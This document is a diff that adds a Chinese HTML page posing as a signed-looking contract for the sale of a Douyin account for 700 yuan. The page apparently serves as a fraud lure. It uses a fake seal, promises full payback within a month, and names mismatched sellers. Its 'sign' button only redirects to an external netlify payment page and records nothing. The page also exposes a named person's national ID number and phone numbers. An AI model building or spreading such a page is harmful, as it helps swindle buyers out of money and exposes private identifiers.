@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>抖音号转让合同</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "SimSun", "宋体", serif;
+        }
+        
+        body {
+            background: #f5f2e9 url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.05"><rect fill="%23f5f2e9" width="100" height="100"/><path fill="%23d4c9a8" d="M0 0 L100 100 M100 0 L0 100"/></svg>');
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .contract-container {
+            width: 800px;
+            background: #fff;
+            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.2);
+            border: 1px solid #d4c9a8;
+            position: relative;
+            padding: 40px;
+            margin: 20px auto;
+        }
+        
+        .contract-container:before {
+            content: "";
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border: 1px solid #e8e0cb;
+            pointer-events: none;
+        }
+        
+        .contract-header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px double #8b4513;
+            position: relative;
+        }
+        
+        .contract-header h1 {
+            font-size: 24px;
+            font-weight: bold;
+            color: #8b4513;
+            letter-spacing: 5px;
+            margin-bottom: 10px;
+        }
+        
+        .contract-header:after {
+            content: "";
+            position: absolute;
+            bottom: -5px;
+            left: 20%;
+            right: 20%;
+            height: 1px;
+            background: #8b4513;
+        }
+        
+        .contract-body {
+            font-size: 14px;
+            line-height: 1.8;
+            color: #333;
+        }
+        
+        .contract-body p {
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+        
+        .contract-body .clause {
+            margin-bottom: 20px;
+        }
+        
+        .contract-body .clause-title {
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 15px;
+            color: #8b4513;
+        }
+        
+        .contract-body .highlight {
+            background-color: #fffacd;
+            padding: 0 3px;
+            font-weight: bold;
+        }
+        
+        .contract-parties {
+            display: flex;
+            justify-content: space-between;
+            margin: 25px 0;
+        }
+        
+        .party {
+            width: 48%;
+        }
+        
+        .party-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #d4c9a8;
+            padding-bottom: 5px;
+        }
+        
+        .party-info {
+            margin-bottom: 8px;
+        }
+        
+        .signature-area {
+            margin-top: 40px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .signature-box {
+            width: 48%;
+            text-align: center;
+        }
+        
+        .signature-title {
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        .signature-line {
+            border-bottom: 1px solid #333;
+            height: 30px;
+            margin-bottom: 5px;
+        }
+        
+        .signature-label {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .stamp-area {
+            position: absolute;
+            bottom: 40px;
+            right: 60px;
+            width: 120px;
+            height: 120px;
+            border: 2px solid #8b4513;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0.8;
+            transform: rotate(-15deg);
+        }
+        
+        .stamp-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #8b4513;
+            letter-spacing: 5px;
+        }
+        
+        .contract-footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #d4c9a8;
+            padding-top: 15px;
+        }
+        
+        .form-section {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f9f7f0;
+            border: 1px solid #e8e0cb;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #d4c9a8;
+            background: #fff;
+        }
+        
+        .submit-section {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .submit-btn {
+            background: #8b4513;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .submit-btn:hover {
+            background: #6b3300;
+        }
+        
+        .submit-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .terms {
+            margin-top: 15px;
+            font-size: 12px;
+        }
+        
+        .watermark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-45deg);
+            font-size: 80px;
+            color: rgba(139, 69, 19, 0.1);
+            pointer-events: none;
+            z-index: 0;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="contract-container">
+        <div class="watermark">麻饼传媒合同协议</div>
+        
+        <div class="contract-header">
+            <h1>抖音号转让合同</h1>
+            <p>合同编号：DY-HT-2023-0865</p>
+        </div>
+        
+        <div class="contract-body">
+            <div class="clause">
+                <div class="clause-title">第一条 合同双方</div>
+                <div class="contract-parties">
+                    <div class="party">
+                        <div class="party-title">甲方（转让方）</div>
+                        <div class="party-info">姓名：李云</div>
+                        <div class="party-info">身份证号码：431321198902215410</div>
+                        <div class="party-info">手机号码：19337686421</div>
+                        
+                    </div>
+                    <div class="party">
+                        <div class="party-title">乙方（受让方）</div>
+                        <div class="party-info">姓名：<span id="buyerNameDisplay">张自伟</span></div>
+                        <div class="party-info">手机号码：<span id="buyerPhoneDisplay">18736789962</span></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第二条 转让标的</div>
+                <p>甲方同意将其合法拥有的抖音账号<span class="highlight">__________</span>）转让给乙方，转让价格为人民币<span class="highlight">七百圆整（¥700.00）</span>。</p>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第三条 权利与义务</div>
+                <p>1. 甲方保证对转让的抖音账号拥有合法所有权，并保证该账号不存在任何权属纠纷、抵押、查封等权利限制。</p>
+                <p>2. 乙方在接收账号后，享有该账号的全部使用权、收益权和管理权。</p>
+                <p>3. 甲方有义务协助乙方完成账号绑定手机、实名认证等相关信息的变更。</p>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第四条 变现保证</div>
+                <p>甲方保证该抖音账号在转让后<span class="highlight">一个月内能够实现100%变现回本</span>。若未能实现此目标，甲方需按照双方协商的方式进行补偿，具体补偿方式为：<span class="highlight">【若1月内收益没有达到680可通过补偿退号等操作】</span>。</p>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第五条 账号风险</div>
+                <p>1. 若账号在转让后因平台规则变更、内容违规等<span class="highlight">非甲方原因导致封号</span>，甲方不承担换号或退款责任。</p>
+                <p>2. 若账号在转让后因甲方转让前的内容或行为导致封号，甲方需承担相应责任，包括但不限于全额退款。</p>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第六条 付款方式</div>
+                <p>乙方应于本合同签订之日一次性支付全部转让价款。支付方式为：<span class="highlight">__________</span>。</p>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第七条 违约责任</div>
+                <p>任何一方违反本合同约定，应承担违约责任，赔偿因此给对方造成的直接经济损失。</p>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第八条 争议解决</div>
+                <p>因履行本合同所发生的争议，双方应友好协商解决；协商不成的，任何一方均可向甲方所在地有管辖权的人民法院提起诉讼。</p>
+            </div>
+            
+            <div class="clause">
+                <div class="clause-title">第九条 合同生效</div>
+                <p>本合同一式两份，甲乙双方各执一份，自双方签字或盖章之日起生效。</p>
+            </div>
+            
+            <div class="signature-area">
+                <div class="signature-box">
+                    <div class="signature-title">甲方（转让方）签字/盖章：</div>
+                    <div class="signature-line"></div>
+                    <div class="signature-label">杨志平</div>
+                </div>
+                <div class="signature-box">
+                    <div class="signature-title">乙方（受让方）签字/盖章：</div>
+                    <div class="signature-line"></div>
+                    <div class="signature-label">张自伟</div>
+                </div>
+            </div>
+            
+            <div class="contract-footer">
+                <p>签订日期：<span id="contractDate">__________</span></p>
+                <p>签订地点：<span>__________</span></p>
+            </div>
+        </div>
+        
+        <div class="stamp-area">
+            <div class="stamp-text">合同专用章</div>
+        </div>
+        
+        <div class="form-section">
+            <div class="form-group">
+                <label for="buyerName">乙方姓名：</label>
+                <input type="text" id="buyerName" placeholder="请输入您的姓名">
+            </div>
+            
+            <div class="form-group">
+                <label for="buyerPhone">乙方手机号码：</label>
+                <input type="tel" id="buyerPhone" placeholder="请输入您的手机号码">
+            </div>
+            
+            <div class="terms">
+                <input type="checkbox" id="agreeTerms">
+                <label for="agreeTerms">本人已仔细阅读并完全理解本合同所有条款，自愿签订本合同</label>
+            </div>
+            
+            <div class="submit-section">
+                <button class="submit-btn" id="submitBtn" disabled>确认并签署合同</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 设置当前日期
+        const now = new Date();
+        const year = now.getFullYear();
+        const month = String(now.getMonth() + 1).padStart(2, '0');
+        const day = String(now.getDate()).padStart(2, '0');
+        document.getElementById('contractDate').textContent = `${year}年${month}月${day}日`;
+        
+        const submitBtn = document.getElementById('submitBtn');
+        const agreeCheckbox = document.getElementById('agreeTerms');
+        const buyerNameInput = document.getElementById('buyerName');
+        const buyerPhoneInput = document.getElementById('buyerPhone');
+        const buyerNameDisplay = document.getElementById('buyerNameDisplay');
+        const buyerPhoneDisplay = document.getElementById('buyerPhoneDisplay');
+        
+        // 检查表单是否有效
+        function checkFormValidity() {
+            const hasName = buyerNameInput.value.trim() !== '';
+            const hasPhone = buyerPhoneInput.value.trim() !== '';
+            const agreed = agreeCheckbox.checked;
+            
+            // 更新合同中的信息
+            buyerNameDisplay.textContent = hasName ? buyerNameInput.value : "________________";
+            buyerPhoneDisplay.textContent = hasPhone ? buyerPhoneInput.value : "________________";
+            
+            // 启用或禁用提交按钮
+            submitBtn.disabled = !(hasName && hasPhone && agreed);
+        }
+        
+        // 提交合同
+        function submitContract() {
+            if (submitBtn.disabled) return;
+            
+            // 模拟合同签署过程
+            submitBtn.textContent = "签署中...";
+            submitBtn.disabled = true;
+            
+            setTimeout(() => {
+                // 直接跳转到指定链接
+                window.location.href = "https://573.netlify.app/pay.html";
+            }, 1000);
+        }
+        
+        // 事件监听器
+        buyerNameInput.addEventListener('input', checkFormValidity);
+        buyerPhoneInput.addEventListener('input', checkFormValidity);
+        agreeCheckbox.addEventListener('change', checkFormValidity);
+        submitBtn.addEventListener('click', submitContract);
+        
+        // 初始化检查
+        checkFormValidity();
+    </script>
+</body>
+</html>
